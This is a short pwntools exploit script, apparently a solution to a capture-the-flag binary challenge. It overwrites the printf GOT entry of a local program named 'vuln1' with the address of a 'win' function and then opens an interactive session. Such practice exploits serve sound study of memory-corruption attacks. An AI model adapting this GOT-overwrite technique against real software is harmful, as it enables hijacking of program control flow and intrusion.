from pwn import *


	
p = ELF('./vuln1')
r = process('./vuln1')


def gets(payload):
	r.sendline(payload)



if __name__=='__main__':

	#gdb.attach(r,'')
	gets(b'a'*8+p64(p.got['printf']))
	log.info('{}'.format(r.recvline()))
	gets(p64(p.sym['win']))	
	r.interactive()








